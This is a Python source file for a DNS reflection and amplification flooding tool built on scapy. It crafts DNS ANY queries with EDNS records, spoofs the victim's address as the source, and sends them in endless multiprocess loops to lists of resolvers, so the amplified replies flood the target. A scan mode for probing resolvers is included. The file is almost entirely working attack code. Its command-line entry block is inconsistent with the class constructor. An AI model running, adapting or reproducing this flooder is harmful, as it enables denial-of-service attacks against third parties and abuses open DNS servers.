from scapy.all import *
import random
import sys
import ip_addr_util
import multiprocessing

class DNSFlood(multiprocessing.Process):

	def __init__( self ):
		super().__init__()

	def init_scan(self , servers , domains , method, term_flag ):
		self.servers_IPv4 , self.servers_IPv6 = ip_addr_util.seperate_v4_v6( servers )
		ip_addr_util.convert_addresses_to_bytes( self.servers_IPv4 , 4 )
		ip_addr_util.convert_addresses_to_bytes( self.servers_IPv6 , 6 )
		self.domains = domains
		self.socket = conf.L2socket(iface=conf.iface)
		self.method = method
		self.target_ip = None

		self.termination_flag = term_flag

	def init_flood( self , scan_list , iface , target , num_threads , thread_num , term_flag , num_sent ):
		self.method = "flood"
		self.server_map = self.get_flood_map( scan_list )
		self.iface = iface
		self.target = target
		self.num_threads = num_threads
		self.thread_num = thread_num
		self.socket = conf.L2socket(iface=conf.iface)
		self.termination_flag = term_flag
		self.num_sent = num_sent

	def get_flood_map( self , scan_list ):
		server_map = { "v4" : {} ,
					   "v6" : {} }

		#this is terrible coding but it works, the servers are stored as bytes
		for line in scan_list:
			split = line.split("\t")
			server = split[0]
			domain = split[1]
			if ip_addr_util.is_v4( server ):
				server_bytes = ip_addr_util.convert_addr_to_bytes( server , 4)
				v4_map = server_map.get("v4")
				if server_bytes in v4_map:
					v4_map[server_bytes].append( domain )
				else:
					v4_map[server_bytes] = [domain]
			else:
				v6_map = server_map.get("v6")
				server_bytes = ip_addr_util.convert_addr_to_bytes( server , 6 )
				if server_bytes in v6_map:
					v6_map[server_bytes].append( domain )
				else:
					v6_map[server_bytes] = [domain]	

		#for server in v6_map.keys():
		#	print( v6_map.get(server) )	


		return server_map

	def run(self):
		if self.method == "scan":
			self.scan()
		elif self.method == "flood":
			if ip_addr_util.is_v4( self.target ):
				self.floodv4()
			else:
				self.floodv6()

	def termination_check(self):
		if self.termination_flag.value == True:
			exit(0)

	def get_my_ip( self , version ):
	    if version == 4:
	       ip = conf.route.route()[1]
	    else:
	       ip = conf.route6.route()[1]
	    return ip

	def _init_pkt(self , version , ip_source):
		ether=Ether(src = get_if_hwaddr(conf.iface) , dst = getmacbyip(conf.route.route()[2]) )

		if version == 4:
			ip = IP(src=ip_source)
		else:
			ip = IPv6(src=ip_source)

		udp = UDP(dport=53,sport=53)
		dns = DNS( cd=1 ,  ad=1 ,  rd=1 ,
	        	qd=DNSQR(qtype=255 , qname="placeholder.com" ) ,  ar=DNSRROPT() )

		packet = ether/ip/udp/dns
		dns_frame = bytearray(raw(packet))

		if version == 4:
			psuedo_hdr = (  
								dns_frame[26:30] + #ip src
	        	                dns_frame[30:34] + #ip dst
	                	        bytes([0]) + #one byte of zeroes
	                        	bytes([dns_frame[23]]) + #the upper layer protocol
	     	                   	len( dns_frame[34:] ).to_bytes( 2 , byteorder="big") #udp length
	        		     )
		else:
			psuedo_hdr = (
	                        	dns_frame[22:38] + #ip.src
	                        	dns_frame[38:54] + #ip.dst
	                        	bytes([0,dns_frame[20]]) + #bytes([0]) + raw(response[IPv6].nh) +   #wireshark has next header( protocol) as just byte 20
	                        	dns_frame[58:60]   #length of udp headers and app data (should i exclude checksum? )
	                     )
		return (dns_frame , psuedo_hdr)

	def scan(self):
		if len( self.servers_IPv4 ) != 0:
			print("Scanning IPv4 Addresses")
			pkt , psuedo_hdr = self._init_pkt( 4 , self.get_my_ip(4) )
			self._scan_IPv4( pkt , psuedo_hdr , random.randrange( 65535 ) )
		if len( self.servers_IPv6 ) != 0:
			print("Scanning IPv6 Addresses")
			pkt , psuedo_hdr = self._init_pkt( 6 , self.get_my_ip(6) )
			self._scan_IPv6( pkt , psuedo_hdr , random.randrange( 65535 ) )

	def floodv4(self):
		trans_id = random.randrange( 65535 )
		pkt , psuedo_hdr = self._init_pkt( 4 , self.target )
		servers = list(self.server_map.get( "v4" ).keys())

		while True:
			x = self.thread_num

			while x < len( servers ):
				domains = self.server_map.get("v4").get( servers[x] )
				for domain in domains:
					#print( "Thread " + str(self.thread_num) + " " + str(servers[x]) + " " + domain )
					trans_id = ( trans_id + 1 ) % 65535
					pkt , psuedo_hdr = self._patch_domain_v4( pkt , psuedo_hdr , domain )
					pkt , psuedo_hdr = self._patch_IPv4( pkt , psuedo_hdr , trans_id , servers[x] )
					self.socket.send( pkt )
					#print( "sent packet" )
					self.num_sent.value = self.num_sent.value + 1
					self.termination_check()
				x += self.thread_num

	def floodv6(self):
		x = self.thread_num
		pkt , psuedo_hdr = self._init_pkt( 6 , self.target )
		servers = list(self.server_map.get( "v6" ).keys())

		while True:
			x = self.thread_num
			while x < len( servers ):
				trans_id = random.randrange( 65535 )
				domains = self.server_map.get("v6").get( servers[x] )
				for domain in domains:
					#print( "Thread " + str(self.thread_num) + " " + str(servers[x]) + " " + domain )
					trans_id = ( trans_id + 1 ) % 65535
					pkt , psuedo_hdr = self._patch_domain_v6( pkt , psuedo_hdr , domain )
					pkt , psuedo_hdr = self._patch_IPv6( pkt , psuedo_hdr , trans_id , servers[x] )
					self.socket.send( pkt )
					self.num_sent.value = self.num_sent.value + 1
					self.termination_check()
				x += self.thread_num


	#divorce some this shit, look at patch_v6 for comment
	def _scan_IPv6( self , pkt , psuedo_hdr , trans_id ):
		for server in self.servers_IPv6:
			for domain in self.domains:
				self.termination_check()
				trans_id = ( trans_id + 1 ) % 65535
				pkt , psuedo_hdr = self._patch_domain_v6( pkt , psuedo_hdr , domain )
				pkt , psuedo_hdr = self._patch_IPv6( pkt , psuedo_hdr , trans_id , server )
				self.socket.send( pkt )
		return trans_id


	def _scan_IPv4(self , pkt , psuedo_hdr , trans_id ):
		for server in self.servers_IPv4:
			for domain in self.domains:
				self.termination_check()
				trans_id = ( trans_id + 1 ) % 65535
				pkt , psuedo_hdr = self._patch_domain_v4( pkt , psuedo_hdr , domain )
				pkt , psuedo_hdr = self._patch_IPv4( pkt , psuedo_hdr , trans_id , server )
				self.socket.send( pkt )
		return trans_id

	def _flood_IPv4(self):
		pkt , psuedo_hdr = self._init_pkt( 4 , self.get_my_ip(4) )
		trans_id = random.randrange( 65535 )
		while True:
			trans_id = self._scan_IPv4( pkt , psuedo_hdr , trans_id + 1 )

	def _flood_IPv6(self):
		pkt, psuedo_hdr = self._init_pkt( 6 , self.get_my_ip(6) )
		trans_id = random.randrange( 65535 )
		while True:
			trans_id = self._scan_IPv6( pkt , psuedo_hdr , trans_id + 1 )

	# hey for this method seperate the changing of dns_id/ip destination from just fixing the checksum

	#source = bytes[22:38], dest = bytes[38-53] , dns_transaction_id = 62 and 63 , dp_checksum = 60 and 61.
	def _patch_IPv6( self , dns_frame: bytearray, pseudo_hdr: bytearray, dns_id: int , destination:bytes ):
		"""Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""
		#change destination ipv6 = 38-53 inclusive
		dns_frame[38:54] = destination
		pseudo_hdr[16:32] = destination

		# set dns id
		# the byte offsets can be found in Wireshark
		dns_frame[62] = (dns_id >> 8) & 0xFF
		dns_frame[63] = dns_id & 0xFF

		# reset checksum
		dns_frame[60] = 0x00
		dns_frame[61] = 0x00

		# calc new tcp/udp checksum
		ck = checksum( pseudo_hdr + dns_frame[54:] )
		if ck == 0:
			ck = 0xFFFF
		cs = struct.pack("!H", ck)
		dns_frame[60] = cs[0]
		dns_frame[61] = cs[1]

		return ( dns_frame , pseudo_hdr )

#change ip length (16,17) , UDP length ( 38, 39 ) , in dns layer - 54(length of name) followed by the name, followed by null byte, then concat rest of bytes
#also change the . in .com to 0x03
	def _patch_IPv4( self , dns_frame: bytearray, pseudo_hdr: bytearray, dns_id: int, destination: bytes):
		"""Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""

		dns_frame[30:34] = destination
		pseudo_hdr[4:8] = destination

	    # set dns id
	    # the byte offsets can be found in Wireshark
		dns_frame[42] = (dns_id >> 8) & 0xFF
		dns_frame[43] = dns_id & 0xFF

	    # reset checksum
		dns_frame[40] = 0x00
		dns_frame[41] = 0x00

	    # calc new tcp/udp checksum
		ck = checksum(pseudo_hdr + dns_frame[34:] )
		if ck == 0:
			ck = 0xFFFF
		cs = struct.pack("!H", ck)
		dns_frame[40] = cs[0]
		dns_frame[41] = cs[1]

	    # calc new IP checksum
		dns_frame[24] = 0
		dns_frame[25] = 0
		ck = checksum( dns_frame[14:34] )
		if ck == 0:
			ck = 0xFFFF
		cs = struct.pack("!H", ck)
		dns_frame[24] = cs[0]
		dns_frame[25] = cs[1]

		return ( dns_frame , pseudo_hdr )

	def _patch_domain_v6( self , dns_frame , psuedo_hdr , domain ):
		prev_name_length = dns_frame[74]
		name_difference = prev_name_length - ( len(domain) - 4 )
		payload_length = int.from_bytes( dns_frame[58:60] , byteorder="big" ) - name_difference

		#change ip payload length
		dns_frame[18:20] = payload_length.to_bytes( 2 , byteorder="big" )
		#change udp length to the same value
		dns_frame[58:60] = dns_frame[18:20]
		#get new domain name as bytes with the . changed to 0x03
		new_name = domain[0:len(domain)-4].encode("ascii") + (3).to_bytes( 1 , byteorder="big" ) + domain[ len(domain)-3:].encode("ascii")

		#concatenate the front, middle( new length/domain name , and end(dns shit past name) of packet
		dns_frame = dns_frame[0:74] + (len(domain)-4).to_bytes( 1 , byteorder="big" ) + new_name + dns_frame[79+prev_name_length:]

		#fix length of udp headers and app data
		psuedo_hdr[34:36] = dns_frame[18:20]

		return ( dns_frame , psuedo_hdr )

	#bytes([0x00,0x00,0xff,0x00,0x01,0x00,0x00 ,0x29,0x10,0x00,0x00,0x00,0x80,0x00,0x00,0x00])
	#change ip length (16,17) , UDP length ( 38, 39 ) , in dns layer - 54(length of name) followed by the name, followed by null byte, then concat rest of bytes
	#also change the . in .com to 0x03
	def _patch_domain_v4( self, dns_frame , psuedo_hdr , domain ):
		prev_name_size = dns_frame[54]
		name_difference = prev_name_size + 4 - len( domain ) #for the .com
		new_name = domain.encode("ascii")
		ending_bytes = dns_frame[ 55 + prev_name_size + 4 : ] #plus 4 accomodates the .com

		#change domain name length
		dns_frame[54] = len(new_name) - 4 #for the .com

		#change ip length
		dns_frame[16:18] = ( int.from_bytes(dns_frame[16:18],byteorder="big") - name_difference ).to_bytes( 2 , byteorder="big" )

		#change UDP length
		dns_frame[38:40] = ( int.from_bytes(dns_frame[38:40],byteorder="big") - name_difference ).to_bytes( 2 , byteorder="big" )

		#concatenate parts together
		dns_frame = dns_frame[0:55] + new_name + ending_bytes

		#for some reason the . in .com is 3 instedad of ascii value for .
		dns_frame[ 55 + len(new_name) - 4] = 3

		#fix psuedo header
		psuedo_hdr[10:12] = len( dns_frame[34:] ).to_bytes( 2 , byteorder="big" )

		return ( dns_frame , psuedo_hdr )

if __name__ == "__main__":

	if len( sys.argv) < 3:
		print( "Usage: python dns_flood.py servers_list domains_list target" )
		exit(1)


	server_file = sys.argv[1]
	domain_file = sys.argv[2]

	servers = open( server_file , "r" ).read().split("\n")
	del servers[-1] #get rid of empty string

	domains = open( domain_file, "r").read().split("\n")
	del domains[-1]

	flooder = DNSFlood( servers , domains , "scan" )
	flooder.start()
	while True:
		inp = input("type quit to quit")
		if inp == "quit":
			flooder.terminate()
			break
